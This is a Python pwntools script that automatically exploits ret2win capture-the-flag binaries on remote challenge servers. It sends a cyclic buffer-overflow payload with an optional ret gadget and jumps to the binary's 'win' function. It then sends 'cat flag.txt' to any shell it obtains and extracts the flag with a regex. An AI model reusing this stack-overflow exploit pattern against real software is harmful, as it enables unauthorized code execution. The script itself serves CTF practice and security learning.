from pwn import *
import detection
import re

context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)


# ------------------------------------- #
# exploit(binary: str)                  #
#                                       #
# INPUT:  filename of vulnerable binary #
# OUTPUT: remote flag                   #
# ------------------------------------- #
def exploit(binary: str, movaps, times):
    for i in range(2):
        flag_regex = r'flag\{[^}]+\}'

        url = f'ace-service-{binary}.chals.io'
        p = remote(url, 443, ssl=True, sni=url)
        #p = process(binary)
        e = ELF(binary)
        r = ROP(e)
        # p.recvuntil(b'>>>')

        payload = b''

        payload += cyclic(detection.find_rip_offset(binary))
        if movaps:
            payload += p64(r.find_gadget(['ret'])[0])
        payload += p64(e.sym['win'] + (i * 4))

        p.sendline(payload)

        try:  # Do we have a shell?
            p.sendline(b'cat flag.txt')
        except:  # Probably just printed the flag
            pass

        output = p.recvall(timeout=0.2)

        flag = re.findall(flag_regex, output.decode())
    if flag:  # Success
        return flag[0]
    elif times != 0:  # Failure
        return exploit(binary, False, 0)
    else:
        return None


# def main():
#     for i in range(10):
#        flag = exploit(f"bin-ret2win-{i}", True, 1)
#        print(flag)
#
#
# main()
